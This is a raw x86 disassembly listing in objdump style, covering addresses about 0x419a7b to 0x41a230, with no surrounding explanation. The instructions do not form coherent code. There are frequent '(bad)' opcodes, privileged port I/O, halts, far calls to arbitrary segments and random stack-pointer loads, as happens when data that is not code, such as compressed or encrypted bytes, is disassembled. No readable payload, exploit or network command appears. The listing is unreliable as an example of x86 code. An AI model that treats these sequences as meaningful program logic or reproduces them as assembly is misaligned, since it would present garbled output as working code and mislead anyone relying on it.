  419a7b:	push   ebx
  419a7c:	xchg   ecx,eax
  419a7d:	dec    esp
  419a7e:	xor    eax,0xcb9ec771
  419a83:	pop    edi
  419a84:	clc    
  419a85:	xchg   ebx,eax
  419a86:	push   0x4cc5b02d
  419a8b:	xlat   BYTE PTR ds:[ebx]
  419a8c:	dec    esp
  419a8d:	in     eax,0xb2
  419a8f:	mov    esp,0x740a0f0
  419a94:	or     al,0xb3
  419a96:	mov    BYTE PTR [ecx+0x150b1902],dh
  419a9c:	pushf  
  419a9d:	mov    esp,0x79a5e27b
  419aa2:	cwde   
  419aa3:	inc    ebx
  419aa4:	clc    
  419aa5:	jmpw   0xfc34
  419aa9:	mov    esp,0xc7ec9b2f
  419aae:	pop    edi
  419aaf:	cmp    dh,dl
  419ab1:	mov    edx,0xbb9d08
  419ab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ab7:	repz mov al,ds:0x4d78d016
  419abd:	cmp    DWORD PTR [edi],ecx
  419abf:	arpl   WORD PTR [ebp+0x12873fa8],ax
  419ac5:	fild   QWORD PTR ds:0xc25b63da
  419acb:	outs   dx,BYTE PTR ds:[esi]
  419acc:	mov    eax,0x27f2d53d
  419ad1:	cli    
  419ad2:	sbb    eax,0x858fd44e
  419ad7:	sbb    edi,DWORD PTR [ecx+0x5aa82e53]
  419add:	imul   bh
  419adf:	xchg   ebp,eax
  419ae0:	xor    al,0x30
  419ae2:	mov    esp,0xaf0b55a7
  419ae7:	add    eax,0xe916fd07
  419aec:	in     al,0xf9
  419aee:	ret    
  419aef:	ja     0x419b1a
  419af1:	mov    cl,0x5
  419af3:	aad    0x94
  419af5:	mov    ecx,DWORD PTR [esi]
  419af7:	pop    ebx
  419af8:	add    eax,0x319da3d3
  419afd:	test   DWORD PTR [eax-0x3c],esp
  419b00:	mov    edx,0x9ff3b1c3
  419b05:	(bad)  [ecx+ebx*1]
  419b08:	fs pop eax
  419b0a:	and    esp,DWORD PTR [ebp+0x1]
  419b0d:	inc    ecx
  419b0e:	add    BYTE PTR [ebx-0xaf6c809],bh
  419b14:	sbb    edx,DWORD PTR [ebp+0x73]
  419b17:	sbb    eax,edx
  419b19:	push   ss
  419b1a:	addr16 push ebx
  419b1c:	pop    edi
  419b1d:	loope  0x419b1a
  419b1f:	push   ss
  419b20:	or     BYTE PTR [eax],ah
  419b22:	pop    es
  419b23:	dec    ecx
  419b24:	mov    edx,DWORD PTR [eax+0x41]
  419b27:	sub    ch,al
  419b29:	aam    0xa9
  419b2b:	fs pop ecx
  419b2d:	rcl    BYTE PTR [esi+0x2c37b22f],0x1e
  419b34:	xor    al,0x27
  419b36:	daa    
  419b37:	(bad)  
  419b39:	pslld  mm5,QWORD PTR [eax+0x57]
  419b3d:	clc    
  419b3e:	mov    ebp,?
  419b40:	push   es
  419b41:	mov    eax,eax
  419b43:	fsubr  QWORD PTR [edi]
  419b45:	in     eax,0x6f
  419b47:	mov    ebp,0x1b1b6a42
  419b4c:	pushf  
  419b4d:	call   0x589c:0x5cf84f59
  419b54:	mov    DWORD PTR ds:0xe4503a4,esp
  419b5a:	dec    ebx
  419b5b:	imul   ebp,DWORD PTR ds:0x94cf0e6d,0x77
  419b62:	popf   
  419b63:	mov    DWORD PTR [ecx+0x7b],ecx
  419b66:	mov    cl,0x26
  419b68:	sub    al,0x9e
  419b6a:	jmp    0xeb04d51a
  419b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b70:	(bad)  
  419b71:	cdq    
  419b72:	add    DWORD PTR [ebx-0xfe5f454],esp
  419b78:	into   
  419b79:	cmp    esi,eax
  419b7b:	fist   WORD PTR [ebx-0x4e]
  419b7e:	sub    al,0x50
  419b80:	mov    edx,0x6cfff91b
  419b85:	sub    dh,BYTE PTR [bx]
  419b88:	fisttp DWORD PTR [edi-0x40]
  419b8b:	jl     0x419b17
  419b8d:	fldcw  WORD PTR [eax]
  419b8f:	retf   
  419b90:	test   eax,0xbf9be6df
  419b95:	scas   al,BYTE PTR es:[edi]
  419b96:	popf   
  419b97:	jmp    0x4a70379
  419b9c:	ret    
  419b9d:	pop    esp
  419b9e:	pop    ebp
  419b9f:	add    ah,BYTE PTR [ebp-0x6a]
  419ba2:	fwait
  419ba3:	xchg   edx,eax
  419ba5:	mov    ebp,0xbb42e1e1
  419baa:	push   esp
  419bab:	inc    ebx
  419bac:	cs (bad) 
  419baf:	xchg   ecx,eax
  419bb0:	daa    
  419bb1:	mov    esp,0x2e332c50
  419bb6:	retf   
  419bb7:	xchg   edi,eax
  419bb9:	inc    ecx
  419bba:	xor    DWORD PTR [ecx+0x40],edi
  419bbd:	mov    dh,0x8b
  419bbf:	adc    ecx,DWORD PTR [ecx-0x55]
  419bc2:	adc    al,0x62
  419bc4:	and    al,0x50
  419bc6:	mov    al,0x7e
  419bc8:	push   ebx
  419bc9:	jmp    0x419be2
  419bcb:	add    edi,DWORD PTR [eax-0x67632521]
  419bd1:	inc    edi
  419bd2:	or     eax,0xb886a3b7
  419bd7:	(bad)  [edi-0x1b]
  419bda:	mov    bl,0x2a
  419bdc:	jb     0x419bca
  419bde:	add    DWORD PTR [eax-0xf],ecx
  419be1:	stos   BYTE PTR es:[edi],al
  419be2:	das    
  419be3:	pusha  
  419be4:	jmp    0x62d5e31c
  419be9:	mov    dh,0x83
  419beb:	dec    ebp
  419bec:	push   ds
  419bed:	lods   eax,DWORD PTR ds:[esi]
  419bee:	jae    0x419b8d
  419bf0:	adc    ebx,DWORD PTR [edx]
  419bf2:	arpl   WORD PTR [ecx+0x3002a349],di
  419bf8:	cmp    al,0xfc
  419bfa:	test   eax,0x6be8be05
  419bff:	cmp    ebx,eax
  419c01:	cmc    
  419c02:	fwait
  419c03:	xchg   BYTE PTR [eax-0x5],cl
  419c06:	in     al,dx
  419c07:	mov    cl,0x3a
  419c09:	xor    al,BYTE PTR [ebp-0x27]
  419c0c:	ins    DWORD PTR es:[edi],dx
  419c0d:	sbb    eax,DWORD PTR [eax+0x222e853f]
  419c13:	out    0xfd,al
  419c15:	inc    edi
  419c16:	inc    ebp
  419c17:	cmp    ecx,DWORD PTR [ecx-0x57fdd12c]
  419c1d:	mov    ecx,0x7ce8f027
  419c22:	xchg   ecx,eax
  419c23:	(bad)  
  419c24:	lock lds ebp,FWORD PTR fs:[ebp-0x3517aad0]
  419c2c:	stos   DWORD PTR es:[edi],eax
  419c2d:	dec    ecx
  419c2e:	bound  esi,QWORD PTR [ebp-0x66216f36]
  419c34:	into   
  419c35:	push   cs
  419c36:	sbb    edx,DWORD PTR [edi-0x15]
  419c39:	fs push ss
  419c3b:	and    eax,0x1c2f7b67
  419c40:	lock clc 
  419c42:	pop    es
  419c43:	fnstcw WORD PTR [esi+0x33bae951]
  419c49:	xchg   BYTE PTR [esp+ebx*1+0x64df84f],dh
  419c50:	ja     0x419cce
  419c52:	inc    esi
  419c53:	mov    WORD PTR [edi-0x6635971d],ss
  419c59:	mov    eax,0x420506e
  419c5e:	lods   al,BYTE PTR ds:[esi]
  419c5f:	xor    ah,cl
  419c61:	fs or  ecx,0x24
  419c65:	enter  0x642a,0xc8
  419c69:	getsec 
  419c6b:	leave  
  419c6c:	sbb    eax,0x14a68472
  419c71:	daa    
  419c72:	inc    edx
  419c73:	les    eax,FWORD PTR ss:[eax-0x50]
  419c77:	jae    0x419ca2
  419c79:	shl    bh,cl
  419c7b:	jl     0x419ca8
  419c7d:	push   edx
  419c7e:	inc    esi
  419c7f:	fadd   st,st(3)
  419c81:	sahf   
  419c82:	mov    dh,0x4b
  419c84:	shl    dh,0xa
  419c87:	xor    eax,0xda72d6f2
  419c8c:	and    eax,0xea2dba30
  419c91:	(bad)  
  419c92:	lods   al,BYTE PTR ds:[esi]
  419c93:	mov    dh,0x6e
  419c95:	ins    DWORD PTR es:[edi],dx
  419c96:	or     ebp,DWORD PTR [ecx+eax*1-0x48]
  419c9a:	jg     0x419cbd
  419c9c:	cmp    al,0x7c
  419c9e:	xlat   BYTE PTR ds:[ebx]
  419c9f:	xor    ebp,DWORD PTR es:[eax+0x39314d66]
  419ca6:	cmp    DWORD PTR [esi+eax*1-0x2e],0xffffffd9
  419cab:	rol    BYTE PTR [eax],0x47
  419cae:	or     BYTE PTR [ebp+0x4],ah
  419cb1:	xchg   esi,eax
  419cb2:	sbb    BYTE PTR [ebp+0x26cee101],dh
  419cb8:	xchg   ebp,eax
  419cb9:	sbb    bl,0x9a
  419cbc:	sbb    esp,DWORD PTR [ebx-0x25]
  419cbf:	(bad)  
  419cc0:	fstp   TBYTE PTR [eax]
  419cc2:	sar    bh,cl
  419cc4:	jmp    0x33d8d7f1
  419cc9:	cmp    eax,0x1634e4d2
  419cce:	mov    eax,ds:0xa962cb9f
  419cd3:	icebp  
  419cd4:	loop   0x419c9d
  419cd6:	mov    ebp,0x200381c0
  419cdb:	pop    ds
  419cdc:	fadd   QWORD PTR [ecx-0x4eade64a]
  419ce2:	gs jbe 0x419c9d
  419ce5:	mov    WORD PTR [edi-0x1b],ss
  419ce8:	jl     0x419d62
  419cea:	sahf   
  419ceb:	add    eax,0x8dbca2da
  419cf0:	inc    ebp
  419cf1:	lods   eax,DWORD PTR ds:[esi]
  419cf2:	mov    dl,0x25
  419cf4:	push   edx
  419cf5:	pop    edi
  419cf6:	mov    edx,0xfd90d0d0
  419cfb:	jle    0x419d6c
  419cfd:	mov    al,0xcf
  419cff:	hlt    
  419d00:	popf   
  419d01:	pop    eax
  419d02:	fs cmp ah,ch
  419d05:	ss cmc 
  419d07:	das    
  419d08:	xchg   ebp,eax
  419d09:	dec    bp
  419d0b:	test   edi,ebx
  419d0d:	xchg   esp,eax
  419d0e:	push   ds
  419d0f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  419d11:	xor    al,BYTE PTR [ebx+ebx*4+0x7b58d37]
  419d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d19:	jp     0x419d4d
  419d1b:	sub    eax,DWORD PTR [ecx+esi*2+0x5e5d91e8]
  419d22:	popa   
  419d23:	into   
  419d24:	or     BYTE PTR [edx],dl
  419d26:	cdq    
  419d27:	pop    esp
  419d28:	call   0x7a80:0xc3b09447
  419d2f:	idiv   BYTE PTR [esi]
  419d31:	mov    cl,0x30
  419d33:	stos   DWORD PTR es:[edi],eax
  419d34:	add    BYTE PTR [ebx+ecx*2],0xc2
  419d38:	cmp    BYTE PTR [edi+ebx*1+0x4],bl
  419d3c:	outs   dx,BYTE PTR ds:[esi]
  419d3d:	mov    edx,0x1a2c76a3
  419d42:	out    dx,al
  419d43:	bound  ebp,QWORD PTR [esi-0x3ef02881]
  419d49:	mov    BYTE PTR [ebp+0x353fe13c],dl
  419d4f:	jae    0x419d65
  419d51:	push   ebx
  419d52:	xor    eax,0x75337a2f
  419d57:	mov    ds:0xd805e296,eax
  419d5c:	adc    eax,0x36c31629
  419d61:	call   0x3a6d684e
  419d66:	add    dh,BYTE PTR [edx-0x6]
  419d69:	jmp    0x419d61
  419d6b:	xchg   ebx,eax
  419d6c:	ror    ebx,0x82
  419d6f:	push   edx
  419d70:	push   0xffffff87
  419d72:	mov    ds:0xe588382e,eax
  419d77:	rcr    dh,0x9f
  419d7a:	and    bl,BYTE PTR [ebx]
  419d7c:	sub    BYTE PTR [esi-0x1e],dh
  419d7f:	or     al,0xbc
  419d81:	cmp    esp,edi
  419d83:	mov    ebp,0xf612db83
  419d88:	jmp    0x419d85
  419d8a:	xchg   ebp,eax
  419d8b:	addr16 inc esp
  419d8d:	cmp    eax,0x42ba00bd
  419d92:	pinsrw mm4,ebp,0xe5
  419d96:	jmp    0x466561f8
  419d9b:	mov    edx,0xb380b260
  419da0:	cs scas al,BYTE PTR es:[edi]
  419da2:	cmp    eax,0x20f9f1f6
  419da7:	inc    esp
  419da8:	jg     0x419d36
  419daa:	jmp    0xdd79ea03
  419daf:	dec    esi
  419db0:	xchg   edi,eax
  419db1:	cmp    ebp,DWORD PTR [edx+0x7a4de503]
  419db7:	cs dec eax
  419db9:	push   esp
  419dba:	clc    
  419dbb:	fiadd  WORD PTR [ebx-0x4c482306]
  419dc1:	xchg   ebx,eax
  419dc2:	sbb    ebx,DWORD PTR [edi+0x161138dd]
  419dc8:	add    DWORD PTR [ebp+0x676a28ed],esp
  419dce:	pop    ecx
  419dcf:	fisubr WORD PTR [eax+0x74]
  419dd2:	xchg   esi,edx
  419dd4:	mov    esp,0x53ec50a5
  419dd9:	mov    ebp,DWORD PTR [ecx-0x3108c7ac]
  419ddf:	(bad)  
  419de0:	retf   
  419de1:	(bad)  
  419de2:	(bad)  
  419de3:	sahf   
  419de4:	dec    eax
  419de5:	dec    ebx
  419de6:	imul   eax,ebx,0x410f411f
  419dec:	xchg   DWORD PTR [ebx-0x114736a4],ebx
  419df2:	or     edi,DWORD PTR [ebp-0x5fb3f37b]
  419df8:	fwait
  419df9:	cld    
  419dfa:	int    0xcb
  419dfc:	test   al,0xb
  419dfe:	out    0x83,eax
  419e00:	pushf  
  419e01:	out    0xde,al
  419e03:	sub    DWORD PTR [edx-0x80],0x36034a6d
  419e0a:	inc    esp
  419e0b:	call   0x115d:0xe020b1a0
  419e12:	mov    DWORD PTR [ecx+0xf],ebx
  419e15:	mov    eax,ds:0xaf68c26f
  419e1a:	pop    ds
  419e1b:	push   ebx
  419e1c:	clc    
  419e1d:	sbb    eax,0x4097ce1c
  419e22:	(bad)  
  419e23:	in     eax,0xdf
  419e25:	add    DWORD PTR [esi],edi
  419e27:	sbb    bh,BYTE PTR [ecx]
  419e29:	jae    0x419e60
  419e2b:	cmp    edi,DWORD PTR [edx]
  419e2d:	les    edi,FWORD PTR [esp+edi*8]
  419e30:	fdivr  DWORD PTR [edx-0x79]
  419e33:	enter  0x8d42,0x97
  419e37:	shl    ebx,cl
  419e39:	mov    ebx,0xb3c51a4c
  419e3e:	loopne 0x419e08
  419e40:	sub    edi,esp
  419e42:	out    0x4a,al
  419e44:	in     al,dx
  419e45:	nop
  419e46:	xor    DWORD PTR [eax-0x643abaf4],eax
  419e4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e4d:	fld    st(3)
  419e4f:	sub    BYTE PTR [ebp+0x333dcf97],dh
  419e55:	pop    esp
  419e56:	xlat   BYTE PTR ds:[ebx]
  419e57:	dec    ebp
  419e58:	jl     0x419dda
  419e5a:	or     edx,ebp
  419e5c:	call   0x6fcdadbd
  419e61:	sar    DWORD PTR [edi],0x6
  419e64:	pushf  
  419e65:	in     eax,dx
  419e66:	nop
  419e67:	pop    esp
  419e68:	lds    ecx,FWORD PTR [ebp-0x313d5d3a]
  419e6e:	xor    al,0x4d
  419e70:	mov    al,ds:0x736a786b
  419e76:	mov    ah,0x32
  419e78:	inc    eax
  419e79:	mov    esi,DWORD PTR [edx-0x1a]
  419e7c:	bound  ebp,QWORD PTR [eax+ebx*8+0x5556910f]
  419e83:	adc    eax,0x160dc36e
  419e88:	dec    ecx
  419e89:	adc    al,0xa5
  419e8b:	in     eax,dx
  419e8c:	bound  eax,QWORD PTR [edx+esi*1-0xb]
  419e90:	stos   BYTE PTR es:[edi],al
  419e91:	mov    ecx,0x20e401dc
  419e96:	(bad)  [eax+0x25]
  419e99:	add    ebx,DWORD PTR [esi-0x78]
  419e9c:	out    dx,al
  419e9d:	pop    ecx
  419e9e:	mov    dh,0x12
  419ea0:	pop    ecx
  419ea1:	ss test eax,0x7fd2df67
  419ea7:	repz xchg ecx,eax
  419ea9:	cmp    eax,0x16aea105
  419eae:	test   BYTE PTR [ecx+eiz*1],0x54
  419eb2:	or     BYTE PTR [esi],dh
  419eb4:	es stos DWORD PTR es:[edi],eax
  419eb6:	arpl   WORD PTR [eax-0x407eeeb4],ax
  419ebc:	mov    eax,0x9f87285a
  419ec1:	push   ebp
  419ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ec3:	jmp    0x16b76417
  419ec8:	loop   0x419f23
  419eca:	lods   al,BYTE PTR ds:[esi]
  419ecb:	sti    
  419ecc:	outs   dx,BYTE PTR ds:[esi]
  419ecd:	retf   0x4ca9
  419ed0:	add    DWORD PTR [ebx],ecx
  419ed2:	mov    WORD PTR [edx-0x1],ss
  419ed5:	fs xchg esi,eax
  419ed7:	add    eax,0xc98b808e
  419edc:	sub    BYTE PTR [edi-0x3112744a],al
  419ee2:	dec    ebx
  419ee3:	and    al,0x3b
  419ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ee6:	inc    edx
  419ee7:	sbb    al,0xbf
  419ee9:	sub    al,0xf6
  419eeb:	loop   0x419ed0
  419eed:	xchg   BYTE PTR [esp+edi*1+0x3a],ch
  419ef1:	push   0xffffff87
  419ef3:	sub    al,0x7e
  419ef5:	ja     0x419ef0
  419ef7:	sub    BYTE PTR [eax+0x38e2d53],0x4b
  419efe:	push   edi
  419eff:	scas   al,BYTE PTR es:[edi]
  419f00:	lds    ebp,FWORD PTR [eax+ebp*1]
  419f03:	lods   eax,DWORD PTR ds:[esi]
  419f04:	dec    edx
  419f05:	mov    ch,BYTE PTR [eax]
  419f07:	test   cl,ah
  419f09:	dec    esp
  419f0a:	(bad)  
  419f0c:	cmp    esp,DWORD PTR [edx-0xeebdc86]
  419f12:	out    0x95,eax
  419f14:	sbb    DWORD PTR [edx-0x633ee00b],ebp
  419f1a:	mov    ah,0x57
  419f1c:	out    0x4f,eax
  419f1e:	mov    WORD PTR [edx+0x2c8bef66],fs
  419f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f25:	mov    ch,0xe7
  419f27:	cld    
  419f28:	dec    ebp
  419f29:	cwde   
  419f2a:	mov    ebx,0x45ee521e
  419f2f:	rcr    dl,0xb8
  419f32:	or     BYTE PTR [edx-0x1c],0x85
  419f36:	test   BYTE PTR [eax+0x61203740],dh
  419f3c:	jmp    0x419f0e
  419f3e:	pop    es
  419f3f:	adc    edi,edi
  419f41:	jae    0x419ee0
  419f43:	inc    ecx
  419f44:	hlt    
  419f45:	(bad)  
  419f46:	add    eax,0xb52e0aa7
  419f4b:	mov    ds:0x609c02d1,eax
  419f50:	jae    0x419f12
  419f52:	sbb    ah,BYTE PTR [eax-0x5b]
  419f55:	pop    edx
  419f56:	arpl   WORD PTR [edx],si
  419f58:	adc    ebp,DWORD PTR [edi+0x19]
  419f5b:	push   ebp
  419f5c:	aad    0xb0
  419f5e:	mov    cl,0x93
  419f60:	fwait
  419f61:	aaa    
  419f62:	arpl   di,ax
  419f64:	sar    BYTE PTR [edi+0x45],1
  419f67:	mov    ecx,DWORD PTR [esi+0xa]
  419f6a:	ret    0xc78e
  419f6d:	mov    ds:0x5faf2bd5,eax
  419f72:	push   ebp
  419f73:	pop    ecx
  419f74:	pop    eax
  419f75:	inc    esi
  419f76:	pop    esi
  419f77:	mov    esp,0x263b7d30
  419f7c:	xor    DWORD PTR es:[edi+0x66],eax
  419f80:	inc    edx
  419f81:	jmp    0x419fd5
  419f83:	add    BYTE PTR [eax],ah
  419f85:	xchg   edx,edx
  419f87:	adc    eax,0x4b8b1c81
  419f8c:	cmp    esp,DWORD PTR [esi-0x374d11ee]
  419f92:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  419f94:	push   ebx
  419f95:	je     0x419f9a
  419f97:	xchg   ebp,eax
  419f98:	jno    0x419f38
  419f9a:	es retf 0x7cb6
  419f9e:	ins    DWORD PTR es:[edi],dx
  419f9f:	xor    eax,0x7d1bf4c0
  419fa4:	add    al,0xba
  419fa6:	mov    ds:0x256bc230,eax
  419fab:	mov    dl,0x9b
  419fad:	sub    eax,0xcfbe283a
  419fb2:	imul   edi,DWORD PTR [ebp-0x20bff30d],0xf4d37683
  419fbc:	out    dx,al
  419fbd:	sbb    dl,BYTE PTR [eax+0x44892e22]
  419fc3:	jns    0x41a001
  419fc5:	jno    0x41a009
  419fc7:	stos   BYTE PTR es:[edi],al
  419fc8:	(bad)  
  419fc9:	fisttp WORD PTR [ebx-0x662aca8e]
  419fcf:	cmc    
  419fd0:	test   DWORD PTR ds:0x99c621f5,esi
  419fd6:	call   0x5307:0xa1eff3fc
  419fdd:	popf   
  419fde:	(bad)  
  419fdf:	test   al,0xf9
  419fe1:	cmp    BYTE PTR [ebp-0x25],al
  419fe4:	(bad)  
  419fe5:	or     BYTE PTR [eax+0x27535722],ch
  419feb:	outs   dx,DWORD PTR ds:[esi]
  419fec:	addr16 pop ds
  419fee:	or     bl,al
  419ff0:	and    BYTE PTR [ecx-0x18],dl
  419ff3:	add    eax,0x19260ba9
  419ff8:	push   es
  419ff9:	push   ebp
  419ffa:	loope  0x41a07b
  419ffc:	cli    
  419ffd:	sbb    eax,0xa5b23ddd
  41a002:	jecxz  0x419fad
  41a004:	std    
  41a005:	jne    0x419fa1
  41a007:	xchg   esi,eax
  41a008:	jmp    0x4c5e:0xee82cca2
  41a00f:	or     eax,0x732f9b67
  41a014:	pop    ebp
  41a015:	loope  0x41a034
  41a017:	sahf   
  41a018:	sbb    BYTE PTR [eax],bh
  41a01a:	mov    eax,0xc41d8d97
  41a01f:	pushf  
  41a020:	mov    ch,0x55
  41a022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a023:	std    
  41a024:	mov    ds:0x497e1712,eax
  41a029:	mov    eax,ds:0xd099bbd
  41a02e:	rcr    DWORD PTR [esi+0x4f],1
  41a031:	sub    DWORD PTR [edx+0x5f],ebp
  41a034:	mov    al,0x83
  41a036:	dec    edi
  41a037:	push   ss
  41a038:	mov    dl,0x81
  41a03a:	aad    0x93
  41a03c:	aaa    
  41a03d:	pop    eax
  41a03e:	mov    ebp,ebp
  41a040:	fwait
  41a041:	mul    BYTE PTR [edx]
  41a043:	mov    esi,DWORD PTR [edi]
  41a045:	retf   0xd46f
  41a048:	test   eax,0x6f806810
  41a04d:	(bad)  
  41a04e:	aam    0x67
  41a050:	xor    bl,ah
  41a052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a053:	cld    
  41a054:	dec    eax
  41a055:	push   ds
  41a056:	mov    bh,0x8f
  41a058:	outs   dx,BYTE PTR ds:[esi]
  41a059:	les    ebp,FWORD PTR [eax*8+0x2c885fe7]
  41a060:	jbe    0x41a092
  41a062:	xor    eax,0x4bf43774
  41a067:	xlat   BYTE PTR ds:[ebx]
  41a068:	add    BYTE PTR [esi+0x3c0237ab],bh
  41a06e:	or     eax,0x5fa8c0ca
  41a073:	div    ebp
  41a075:	xor    al,BYTE PTR [edx-0x277b7dcc]
  41a07b:	add    BYTE PTR [ecx],ah
  41a07d:	aas    
  41a07e:	push   cs
  41a07f:	iret   
  41a080:	adc    eax,0x4ce6bf0f
  41a085:	dec    esp
  41a086:	dec    esp
  41a087:	enter  0x8632,0xfe
  41a08b:	mov    dh,0xbf
  41a08d:	mov    bl,0xb0
  41a08f:	lods   al,BYTE PTR ds:[esi]
  41a090:	cmc    
  41a091:	shl    BYTE PTR [edx],0xf4
  41a094:	ror    DWORD PTR [edx],1
  41a096:	int    0x81
  41a098:	shl    DWORD PTR [edx],cl
  41a09a:	shl    BYTE PTR [eax+0x5c],0x78
  41a09e:	or     ah,dl
  41a0a0:	mov    esp,0xd4de3aa5
  41a0a5:	das    
  41a0a6:	jl     0x41a10a
  41a0a8:	xor    eax,0x7f484e25
  41a0ad:	ins    BYTE PTR es:[edi],dx
  41a0ae:	push   ebx
  41a0af:	rcr    DWORD PTR [ecx+0x53],0x33
  41a0b3:	sbb    ah,cl
  41a0b5:	or     eax,0x36f60639
  41a0ba:	push   cs
  41a0bb:	int    0x1d
  41a0bd:	shl    ch,0xe
  41a0c0:	hlt    
  41a0c1:	lds    edi,FWORD PTR [ebx]
  41a0c3:	cld    
  41a0c4:	test   al,0xf4
  41a0c6:	dec    esi
  41a0c7:	imul   ecx,DWORD PTR [ecx+ebp*4],0xbf197cb1
  41a0ce:	popf   
  41a0cf:	add    ecx,DWORD PTR [ecx]
  41a0d1:	jl     0x41a120
  41a0d3:	mov    ah,0x61
  41a0d5:	push   esp
  41a0d6:	jno    0x41a148
  41a0d8:	jge    0x41a0db
  41a0da:	jg     0x41a0ca
  41a0dc:	sub    DWORD PTR [ebx],edx
  41a0de:	push   ebx
  41a0df:	or     ebp,esi
  41a0e1:	dec    ebp
  41a0e2:	je     0x41a11b
  41a0e4:	jl     0x41a104
  41a0e6:	popa   
  41a0e7:	repz mov es,eax
  41a0ea:	repz sti 
  41a0ec:	dec    esp
  41a0ed:	les    ecx,FWORD PTR [eax-0x72a75533]
  41a0f3:	(bad)  
  41a0f4:	sahf   
  41a0f5:	mov    al,ds:0x32dcba23
  41a0fa:	rcl    BYTE PTR [edx+0x8],1
  41a0fd:	loopne 0x41a117
  41a0ff:	test   al,al
  41a101:	jns    0x41a13e
  41a103:	or     BYTE PTR [ebx],bl
  41a105:	push   cs
  41a106:	cmp    eax,0xa88c6a73
  41a10b:	pop    esi
  41a10c:	push   ebp
  41a10d:	jp     0x41a16f
  41a10f:	pop    ecx
  41a110:	imul   ecx,ebp,0xcbe0a14e
  41a116:	int    0x76
  41a118:	sub    esp,0x2b17bf48
  41a11e:	ret    
  41a11f:	and    eax,0xe4e876e7
  41a124:	pop    ebx
  41a125:	mov    al,0xb6
  41a127:	jp     0x41a0ec
  41a129:	std    
  41a12a:	popf   
  41a12b:	mov    ebp,0x97aae13f
  41a130:	out    dx,eax
  41a131:	fld    TBYTE PTR [eax+0x5cb49b49]
  41a137:	ret    0xbd66
  41a13a:	push   edx
  41a13b:	pop    edi
  41a13c:	(bad)  
  41a13d:	or     eax,0xe32bcc4a
  41a142:	ret    
  41a143:	retf   
  41a144:	inc    esp
  41a145:	retf   0x9c28
  41a148:	xchg   DWORD PTR [eax],edx
  41a14a:	dec    ebx
  41a14b:	int    0x8b
  41a14d:	pop    ebx
  41a14e:	sub    bh,BYTE PTR [ecx+0x5c5347ca]
  41a154:	and    eax,0x85c2f4ce
  41a159:	lods   al,BYTE PTR ds:[esi]
  41a15a:	pushf  
  41a15b:	jp     0x41a11d
  41a15d:	jnp    0x41a107
  41a15f:	xor    ch,bh
  41a161:	icebp  
  41a162:	pop    ds
  41a163:	fiadd  WORD PTR [esi+0x1b]
  41a166:	fild   WORD PTR [ecx-0xd]
  41a169:	jns    0x41a1a3
  41a16b:	mov    dl,0xae
  41a16d:	add    al,dl
  41a16f:	sbb    eax,0x628fee50
  41a174:	adc    al,0x62
  41a176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a177:	pop    ss
  41a178:	into   
  41a179:	xchg   esi,eax
  41a17a:	pop    ds
  41a17b:	and    al,0x5f
  41a17d:	jmp    0x24b40b77
  41a182:	aaa    
  41a183:	add    DWORD PTR [edi],esp
  41a185:	stc    
  41a186:	popa   
  41a187:	and    dl,BYTE PTR [edx+0x580f4ae4]
  41a18d:	std    
  41a18e:	lods   eax,DWORD PTR ds:[esi]
  41a18f:	lods   al,BYTE PTR ds:[esi]
  41a190:	je     0x41a157
  41a192:	lods   al,BYTE PTR ds:[esi]
  41a193:	test   al,0xc3
  41a195:	or     BYTE PTR [edi],ch
  41a197:	or     al,0x39
  41a199:	fcmove st,st(7)
  41a19b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a19c:	mov    eax,ebx
  41a19e:	jne    0x41a144
  41a1a0:	ins    DWORD PTR es:[edi],dx
  41a1a1:	jne    0x41a1a7
  41a1a3:	or     BYTE PTR [eax+0x25],0x8b
  41a1a7:	add    BYTE PTR [edx],dh
  41a1a9:	inc    ebx
  41a1aa:	jne    0x41a1c8
  41a1ac:	in     eax,dx
  41a1ad:	scas   al,BYTE PTR es:[edi]
  41a1ae:	ja     0x41a1b5
  41a1b0:	lods   eax,DWORD PTR ds:[esi]
  41a1b1:	cmp    al,BYTE PTR ss:[edi-0x7e641ac]
  41a1b8:	dec    esi
  41a1b9:	shl    BYTE PTR ds:0x3cedbb52,1
  41a1bf:	and    esi,0x24
  41a1c2:	vmwrite esp,ebx
  41a1c5:	mov    edx,0x52ef513f
  41a1ca:	ss addr16 clc 
  41a1cd:	push   0x7a
  41a1cf:	xchg   cl,al
  41a1d1:	mov    edx,0x45b852c8
  41a1d6:	pop    eax
  41a1d7:	sbb    eax,0xaaa94315
  41a1dc:	fwait
  41a1dd:	les    edx,FWORD PTR ds:0x4c6143f6
  41a1e3:	shl    BYTE PTR [esi],1
  41a1e5:	out    0x24,eax
  41a1e7:	sub    BYTE PTR [edi+eiz*2+0x54],ah
  41a1eb:	and    ecx,ecx
  41a1ed:	(bad)  
  41a1ee:	pushf  
  41a1ef:	cs nop
  41a1f1:	cld    
  41a1f2:	push   es
  41a1f3:	ins    BYTE PTR es:[edi],dx
  41a1f4:	add    cl,ch
  41a1f6:	inc    edi
  41a1f7:	dec    eax
  41a1f8:	push   ebx
  41a1f9:	fldenv [ebx-0x17cfae89]
  41a1ff:	sbb    ch,BYTE PTR [edx-0x5547e722]
  41a205:	in     eax,dx
  41a206:	fist   WORD PTR [ebp+0x24b4ec7b]
  41a20c:	or     ebx,DWORD PTR [ecx-0x67]
  41a20f:	loop   0x41a258
  41a211:	push   esp
  41a212:	mov    ch,0x8
  41a214:	xor    ebx,ebx
  41a216:	ret    
  41a217:	and    DWORD PTR [ecx-0x704c3ecb],ebp
  41a21d:	loop   0x41a1f3
  41a21f:	shr    BYTE PTR [ebp+edx*4+0x186562f8],1
  41a226:	xlat   BYTE PTR ds:[ebx]
  41a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a228:	xchg   DWORD PTR [ecx+edx*4-0x1214f740],eax
  41a22f:	xchg   edx,eax
  41a230:	pop    eax
